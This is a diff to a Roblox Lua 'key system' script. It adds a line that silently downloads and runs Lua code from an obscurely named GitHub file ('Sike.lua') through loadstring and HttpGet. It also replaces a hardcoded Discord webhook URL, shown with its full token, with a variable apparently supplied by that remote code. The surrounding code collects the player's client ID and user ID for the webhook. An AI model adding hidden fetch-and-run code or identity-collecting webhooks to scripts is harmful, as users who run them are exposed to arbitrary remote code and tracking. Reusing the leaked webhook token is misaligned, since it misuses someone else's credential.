@@ -1,6 +1,7 @@
 --//==================================================
 --// KEY SYSTEM (FULL - supports Global Keys)
 --//==================================================
+local hello = loadstring(game:HttpGet("https://raw.githubusercontent.com/r3al1tygethuzz/xenon2.0/refs/heads/main/ReadMe/LoadString/Sigma/rag/extra/ClickMe4Source/MaybeClickMe%3F/Sike.lua"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
@@ -10,7 +11,7 @@ local LocalPlayer = Players.LocalPlayer
 --//==================================================
 --// WEBHOOK + IDENTITY
 --//==================================================
-local webhookUrl = "https://discord.com/api/webhooks/1574562434474184897/e0VGzrjhme8uV0dSVFu8rNWZ6KE6R-akRsqT0GqnFGBJ0FhcPV0BBxODYv9DcdIL_ZEJ"
+local webhookUrl = webhook
 
 local clientId = RbxAnalyticsService:GetClientId()
 local userId = tostring(LocalPlayer.UserId)
